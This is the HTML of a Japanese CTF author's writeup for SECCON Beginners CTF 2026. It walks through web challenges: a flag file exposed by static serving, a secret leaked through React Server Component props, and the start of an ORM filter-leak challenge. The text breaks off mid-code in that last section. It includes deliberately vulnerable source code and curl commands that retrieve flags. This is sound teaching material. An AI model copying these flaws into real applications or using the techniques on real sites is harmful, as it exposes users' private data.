@@ -1,0 +1,484 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>SECCON Beginners CTF 2026 portfolio, bookshelf, footnote, omikuji, viewer, greenroom, twins 作問者writeup - yuasa's blog</title><link rel=icon href=/images/favicon.ico sizes=any><link rel=icon type=image/png sizes=256x256 href=/images/favicon.png><link rel=icon type=image/png sizes=32x32 href=/images/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/images/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SECCON Beginners CTF 2026で出題した portfolio, bookshelf, footnote, omikuji, viewer, greenroom, twins の作問者writeupです。
+各問題のジャンル、難易度はこちらです。
+問題名 ジャンル 難易度 solve数 portfolio web beginner 531 bookshelf web easy 494 footnote web medium 360 omikuji misc beginner 416 viewer misc easy 390 greenroom misc hard 266 twins crypto beginner 418 他の作問者の方々のwriteupもぜひご覧ください。
+SECCON Beginners CTF 2026 Pwn 作問者writeup [web] portfolio 問題文はこちらです。solve数は531でした。
+はじめて作ったポートフォリオサイトを公開しました。 http://portfolio.beginners.seccon.games:33455 公開されているディレクトリに、見せてはいけないファイルを置いてしまうという、Webサイト制作をはじめた頃にやってしまいそうなミスを題材にしました。CTFのWeb問題に初めて取り組む方でも、ページを見て、ソースを読んで、順番に確認するとFLAGにたどり着けるような問題を目指しました。
+まずは問題サーバにアクセスしてみます。トップページにはポートフォリオサイトのような画面が表示され、管理ページへのリンクがあります。
+管理ページにアクセスしてみると、403 Forbidden が返ってきます。
+$ curl -i http://portfolio.beginners.seccon.games:33455/admin HTTP/1.1 403 Forbidden ... 配布ファイルの app/index."><meta property="og:image" content><meta property="og:title" content="SECCON Beginners CTF 2026 portfolio, bookshelf, footnote, omikuji, viewer, greenroom, twins 作問者writeup"><meta property="og:description" content="SECCON Beginners CTF 2026で出題した portfolio, bookshelf, footnote, omikuji, viewer, greenroom, twins の作問者writeupです。
+各問題のジャンル、難易度はこちらです。
+問題名 ジャンル 難易度 solve数 portfolio web beginner 531 bookshelf web easy 494 footnote web medium 360 omikuji misc beginner 416 viewer misc easy 390 greenroom misc hard 266 twins crypto beginner 418 他の作問者の方々のwriteupもぜひご覧ください。
+SECCON Beginners CTF 2026 Pwn 作問者writeup [web] portfolio 問題文はこちらです。solve数は531でした。
+はじめて作ったポートフォリオサイトを公開しました。 http://portfolio.beginners.seccon.games:33455 公開されているディレクトリに、見せてはいけないファイルを置いてしまうという、Webサイト制作をはじめた頃にやってしまいそうなミスを題材にしました。CTFのWeb問題に初めて取り組む方でも、ページを見て、ソースを読んで、順番に確認するとFLAGにたどり着けるような問題を目指しました。
+まずは問題サーバにアクセスしてみます。トップページにはポートフォリオサイトのような画面が表示され、管理ページへのリンクがあります。
+管理ページにアクセスしてみると、403 Forbidden が返ってきます。
+$ curl -i http://portfolio.beginners.seccon.games:33455/admin HTTP/1.1 403 Forbidden ... 配布ファイルの app/index."><meta property="og:type" content="article"><meta property="og:url" content="/posts/52/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-06-14T14:06:48+09:00"><meta property="article:modified_time" content="2026-06-14T14:06:48+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="SECCON Beginners CTF 2026 portfolio, bookshelf, footnote, omikuji, viewer, greenroom, twins 作問者writeup"><meta name=twitter:description content="SECCON Beginners CTF 2026で出題した portfolio, bookshelf, footnote, omikuji, viewer, greenroom, twins の作問者writeupです。
+各問題のジャンル、難易度はこちらです。
+問題名 ジャンル 難易度 solve数 portfolio web beginner 531 bookshelf web easy 494 footnote web medium 360 omikuji misc beginner 416 viewer misc easy 390 greenroom misc hard 266 twins crypto beginner 418 他の作問者の方々のwriteupもぜひご覧ください。
+SECCON Beginners CTF 2026 Pwn 作問者writeup [web] portfolio 問題文はこちらです。solve数は531でした。
+はじめて作ったポートフォリオサイトを公開しました。 http://portfolio.beginners.seccon.games:33455 公開されているディレクトリに、見せてはいけないファイルを置いてしまうという、Webサイト制作をはじめた頃にやってしまいそうなミスを題材にしました。CTFのWeb問題に初めて取り組む方でも、ページを見て、ソースを読んで、順番に確認するとFLAGにたどり着けるような問題を目指しました。
+まずは問題サーバにアクセスしてみます。トップページにはポートフォリオサイトのような画面が表示され、管理ページへのリンクがあります。
+管理ページにアクセスしてみると、403 Forbidden が返ってきます。
+$ curl -i http://portfolio.beginners.seccon.games:33455/admin HTTP/1.1 403 Forbidden ... 配布ファイルの app/index."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>SECCON Beginners CTF 2026 portfolio, bookshelf, footnote, omikuji, viewer, greenroom, twins 作問者writeup</h1><div class=meta>Posted on Jun 14, 2026</div></div><nav id=TableOfContents><ol><li><a href=#web-portfolio>[web] portfolio</a></li><li><a href=#web-bookshelf>[web] bookshelf</a></li><li><a href=#web-footnote>[web] footnote</a></li><li><a href=#misc-omikuji>[misc] omikuji</a></li><li><a href=#misc-viewer>[misc] viewer</a></li><li><a href=#misc-greenroom>[misc] greenroom</a></li><li><a href=#crypto-twins>[crypto] twins</a></li><li><a href=#おわりに>おわりに</a></li></ol></nav><section class=body><p><a href=https://www.seccon.jp/15/seccon_beginners/ctf.html>SECCON Beginners CTF 2026</a>で出題した <code>portfolio</code>, <code>bookshelf</code>, <code>footnote</code>, <code>omikuji</code>, <code>viewer</code>, <code>greenroom</code>, <code>twins</code> の作問者writeupです。</p><p>各問題のジャンル、難易度はこちらです。</p><table><thead><tr><th>問題名</th><th>ジャンル</th><th>難易度</th><th style=text-align:right>solve数</th></tr></thead><tbody><tr><td>portfolio</td><td>web</td><td>beginner</td><td style=text-align:right>531</td></tr><tr><td>bookshelf</td><td>web</td><td>easy</td><td style=text-align:right>494</td></tr><tr><td>footnote</td><td>web</td><td>medium</td><td style=text-align:right>360</td></tr><tr><td>omikuji</td><td>misc</td><td>beginner</td><td style=text-align:right>416</td></tr><tr><td>viewer</td><td>misc</td><td>easy</td><td style=text-align:right>390</td></tr><tr><td>greenroom</td><td>misc</td><td>hard</td><td style=text-align:right>266</td></tr><tr><td>twins</td><td>crypto</td><td>beginner</td><td style=text-align:right>418</td></tr></tbody></table><p>他の作問者の方々のwriteupもぜひご覧ください。</p><ul><li><a href=https://ham4.hatenablog.jp/entry/2026/06/14/214453>SECCON Beginners CTF 2026 Pwn 作問者writeup</a></li></ul><h1 id=web-portfolio>[web] portfolio</h1><p>問題文はこちらです。solve数は531でした。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>はじめて作ったポートフォリオサイトを公開しました。 
+</span></span><span style=display:flex><span>http://portfolio.beginners.seccon.games:33455
+</span></span></code></pre></div><p>公開されているディレクトリに、見せてはいけないファイルを置いてしまうという、Webサイト制作をはじめた頃にやってしまいそうなミスを題材にしました。CTFのWeb問題に初めて取り組む方でも、ページを見て、ソースを読んで、順番に確認するとFLAGにたどり着けるような問題を目指しました。</p><p>まずは問題サーバにアクセスしてみます。トップページにはポートフォリオサイトのような画面が表示され、管理ページへのリンクがあります。</p><p><img src=/images/posts/52/portfolio-top.png alt=portfolio-top></p><p>管理ページにアクセスしてみると、<code>403 Forbidden</code> が返ってきます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ curl -i http://portfolio.beginners.seccon.games:33455/admin
+</span></span><span style=display:flex><span>HTTP/1.1 403 Forbidden
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>配布ファイルの <code>app/index.js</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>path</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;path&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>PORT</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>PORT</span> <span style=color:#f92672>||</span> <span style=color:#ae81ff>33455</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>publicDir</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;public&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#66d9ef>static</span>(<span style=color:#a6e22e>publicDir</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/admin&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>403</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`&lt;!doctype html&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>...
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p><code>/admin</code> は確かに <code>403</code> を返すようになっています。
+一方で、<code>public/</code> 配下は <a href=https://expressjs.com/en/starter/static-files/><code>express.static</code></a> で静的ファイルとして配信されています。</p><p>配布ファイルの構成を見ると、<code>public/</code> 配下に <code>admin.html</code> があります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>app/public/index.html
+</span></span><span style=display:flex><span>app/public/admin.html
+</span></span><span style=display:flex><span>app/public/styles.css
+</span></span><span style=display:flex><span>app/public/flag.txt
+</span></span></code></pre></div><p><code>/admin</code> は拒否されますが、<code>/admin.html</code> は静的ファイルとして直接読めそうです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ curl http://portfolio.beginners.seccon.games:33455/admin.html
+</span></span><span style=display:flex><span>&lt;!doctype html&gt;
+</span></span><span style=display:flex><span>&lt;html lang=&#34;ja&#34;&gt;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>      &lt;p&gt;flag is in &lt;code&gt;/flag.txt&lt;/code&gt;&lt;/p&gt;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>&lt;/html&gt;
+</span></span></code></pre></div><p><code>admin.html</code> には <code>flag is in /flag.txt</code> と書かれています。
+そのため、<code>/flag.txt</code> にアクセスします。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ curl http://portfolio.beginners.seccon.games:33455/flag.txt
+</span></span><span style=display:flex><span>ctf4b{my_f1r57_p0r7f0l10_mistake}
+</span></span></code></pre></div><p>無事にFLAGが取得できました！</p><h1 id=web-bookshelf>[web] bookshelf</h1><p>問題文はこちらです。solve数は494でした。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>書籍レビューサイトを公開しました。
+</span></span><span style=display:flex><span>http://bookshelf.beginners.seccon.games:33456
+</span></span></code></pre></div><p><a href=https://react.dev/reference/rsc/server-components>React Server Components</a>を題材にした問題です。<a href=https://nextjs.org/docs/app>Next.js App Router</a>ではReact Server Componentsが標準で使われており、Server ComponentとClient Componentを組み合わせてアプリケーションを作れます。React Server Componentsの周辺は、Next.jsなどの実装や関連する脆弱性の話題でも見かけることがあり、以前からそれを題材とした問題を作りたいと思っていました。</p><p>自分はNext.jsやReact Server Componentsにすごく慣れているわけではないのですが、触ってみると、バックエンド側の処理とクライアント側の処理が近いソースコード内に混在しているのが新鮮でした。今回は、<a href=https://nextjs.org/docs/app/api-reference/directives/use-client><code>"use client"</code></a> を使うときにやってしまいそうな、Server ComponentからClient Componentへ渡す値のミスを題材にしています。</p><p>まず問題サーバを開くと、小さな書籍レビューサイトが表示されます。書籍一覧から詳細ページへ移動できます。</p><p><img src=/images/posts/52/bookshelf-list.png alt=bookshelf-list></p><p><code>/books/2</code> を開いてみます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>http://bookshelf.beginners.seccon.games:33456/books/2
+</span></span></code></pre></div><p>画面上にはタイトル、著者、説明文、評価などが表示されています。FLAGらしきものは見当たりません。</p><p><img src=/images/posts/52/bookshelf-detail.png alt=bookshelf-detail></p><p>配布ファイルを確認します。<code>app/books/[id]/page.tsx</code> には、書籍データが定義されています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tsx data-lang=tsx><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>books</span>: <span style=color:#66d9ef>Book</span>[] <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;1&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>title</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;The Little Web&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>author</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Alice&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>description</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;A gentle introduction to web applications.&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>rating</span>: <span style=color:#66d9ef>4</span>,
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;2&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>title</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Flight Book&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>author</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Bob&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>description</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Notes about modern React rendering.&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>rating</span>: <span style=color:#66d9ef>5</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>internalNote</span>: <span style=color:#66d9ef>process.env.FLAG</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#34;ctf4b{dummy_flag}&#34;</span>,
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;3&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>title</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;HTTP Field Guide&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>author</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Carol&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>description</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;A small book about requests and responses.&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>rating</span>: <span style=color:#66d9ef>3</span>,
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>];
+</span></span></code></pre></div><p><code>/books/2</code> のデータだけに <code>internalNote</code> があり、そこに <code>process.env.FLAG</code> が入っています。</p><p>同じファイルの下の方を見ると、<code>book</code> オブジェクトをそのまま <code>BookDetail</code> に渡しています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tsx data-lang=tsx><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>default</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>BookPage</span>({ <span style=color:#a6e22e>params</span> }<span style=color:#f92672>:</span> <span style=color:#a6e22e>BookPageProps</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>id</span> } <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>params</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>book</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>books</span>.<span style=color:#a6e22e>find</span>((<span style=color:#a6e22e>item</span>) <span style=color:#f92672>=&gt;</span> <span style=color:#a6e22e>item</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>id</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>book</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>notFound</span>();
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>section</span>&gt;
+</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>Link</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/books&#34;</span> <span style=color:#a6e22e>className</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;back-link&#34;</span>&gt;
+</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>書籍一覧に戻る</span>
+</span></span><span style=display:flex><span>      &lt;/<span style=color:#f92672>Link</span>&gt;
+</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>BookDetail</span> <span style=color:#a6e22e>book</span><span style=color:#f92672>=</span>{<span style=color:#a6e22e>book</span>} /&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>section</span>&gt;
+</span></span><span style=display:flex><span>  );
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>次に <code>app/books/[id]/BookDetail.tsx</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tsx data-lang=tsx><span style=display:flex><span><span style=color:#e6db74>&#34;use client&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>type</span> <span style=color:#a6e22e>Book</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>id</span>: <span style=color:#66d9ef>string</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>title</span>: <span style=color:#66d9ef>string</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>author</span>: <span style=color:#66d9ef>string</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>description</span>: <span style=color:#66d9ef>string</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>rating</span>: <span style=color:#66d9ef>number</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>internalNote?</span>: <span style=color:#66d9ef>string</span>;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>type</span> <span style=color:#a6e22e>BookDetailProps</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>book</span>: <span style=color:#66d9ef>Book</span>;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>default</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>BookDetail</span>({ <span style=color:#a6e22e>book</span> }<span style=color:#f92672>:</span> <span style=color:#a6e22e>BookDetailProps</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>article</span> <span style=color:#a6e22e>className</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;detail-panel&#34;</span>&gt;
+</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>className</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;book-number&#34;</span>&gt;<span style=color:#960050;background-color:#1e0010>書籍</span> {<span style=color:#a6e22e>book</span>.<span style=color:#a6e22e>id</span>}&lt;/<span style=color:#f92672>p</span>&gt;
+</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>h1</span>&gt;{<span style=color:#a6e22e>book</span>.<span style=color:#a6e22e>title</span>}&lt;/<span style=color:#f92672>h1</span>&gt;
+</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>className</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;muted&#34;</span>&gt;<span style=color:#960050;background-color:#1e0010>著者</span><span style=color:#f92672>:</span> {<span style=color:#a6e22e>book</span>.<span style=color:#a6e22e>author</span>}&lt;/<span style=color:#f92672>p</span>&gt;
+</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>className</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;description&#34;</span>&gt;{<span style=color:#a6e22e>book</span>.<span style=color:#a6e22e>description</span>}&lt;/<span style=color:#f92672>p</span>&gt;
+</span></span><span style=display:flex><span>      ...
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>article</span>&gt;
+</span></span><span style=display:flex><span>  );
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>先頭に <code>"use client"</code> があるため、<code>BookDetail</code> はClient Componentです。Client Componentへpropsとして渡す値はブラウザ側へ送られるため、画面上で <code>internalNote</code> を表示していなくても、<code>book</code> オブジェクトに含まれる <code>internalNote</code> もレスポンス内に含まれてしまいます。</p><p>もし <code>BookDetail</code> がServer Componentのままであれば、<code>internalNote</code> をHTMLに出力したり、別のClient Componentへ渡したりしない限り、この値はブラウザ側へ送られません。今回は <code>BookDetail</code> に <code>"use client"</code> が付いており、<code>book</code> オブジェクト全体をClient Componentのpropsとして渡していることが問題になります。</p><p>そのため、ページのレスポンスやDevToolsのNetworkタブで <code>internalNote</code> や <code>ctf4b{</code> を検索するとFLAGを見つけることができます。</p><p><img src=/images/posts/52/bookshelf-network.png alt=bookshelf-network></p><p>curlでも確認できます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ curl -s http://bookshelf.beginners.seccon.games:33456/books/2 | grep -o <span style=color:#e6db74>&#39;ctf4b{[^}]*}&#39;</span>
+</span></span><span style=display:flex><span>ctf4b{r5c_pr0p5_4r3_n0t_s3cr3t}
+</span></span></code></pre></div><p>無事にFLAGが取得できました！</p><h1 id=web-footnote>[web] footnote</h1><p>問題文はこちらです。solve数は360でした。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>記事には、著者だけが知っている小さな footnote が残されているようです。 
+</span></span><span style=display:flex><span>http://footnote.beginners.seccon.games:44566
+</span></span></code></pre></div><p><a href=https://portswigger.net/research/top-10-web-hacking-techniques-of-2025>PortSwigger ResearchのTop 10 Web Hacking Techniques of 2025</a>で紹介されていた「<a href=https://www.elttam.com/blog/leaking-more-than-you-joined-for/>ORM Leaking More Than You Joined For</a>」が元ネタです。</p><p>ORMを使うと、昔ながらのSQLインジェクションは起きにくくなる場合があります。一方で、ORMの便利な機能をユーザー入力からそのまま組み立てると、SQL文字列を直接壊さなくても、非公開の値を検索条件として使えてしまうことがあります。そこが面白かったので問題にしました。</p><p>まず問題サーバにアクセスすると、記事検索サービスが表示されます。</p><p><img src=/images/posts/52/footnote-top.png alt=footnote-top></p><p>普通に検索してみます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#39;http://footnote.beginners.seccon.games:44566/api/articles/search?q=図書室&#39;</span>
+</span></span><span style=display:flex><span>{&#34;count&#34;:1,&#34;articles&#34;:[...]}
+</span></span></code></pre></div><p>レスポンスには <code>count</code> と記事一覧が含まれます。著者プロフィールの公開情報は返ってきますが、非公開メモのような値は返ってきません。</p><p>配布ファイルの <code>src/server.ts</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>articleSelect</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>id</span>: <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>title</span>: <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>body</span>: <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>author</span><span style=color:#f92672>:</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>select</span><span style=color:#f92672>:</span> {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>profile</span><span style=color:#f92672>:</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>select</span><span style=color:#f92672>:</span> {
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>displayName</span>: <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>bio</span>: <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p><code>displayName</code> と <code>bio</code> はレスポンスに含まれますが、<code>secretMemo</code> は含まれていません。</p><p>次に検索APIの処理を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#66d9ef>get</span>(<span style=color:#e6db74>&#34;/api/articles/search&#34;</span>, <span style=color:#a6e22e>searchLimiter</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) <span style=color:#f92672>=&gt;</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>filterWhere</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>isAdvancedSearch</span>({
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>field</span>: <span style=color:#66d9ef>req.query.field</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>op</span>: <span style=color:#66d9ef>req.query.op</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>value</span>: <span style=color:#66d9ef>req.query.value</span>,
+</span></span><span style=display:flex><span>    })
+</span></span><span style=display:flex><span>      <span style=color:#f92672>?</span> <span style=color:#a6e22e>buildAdvancedWhere</span>({
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>field</span>: <span style=color:#66d9ef>req.query.field</span>,
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>op</span>: <span style=color:#66d9ef>req.query.op</span>,
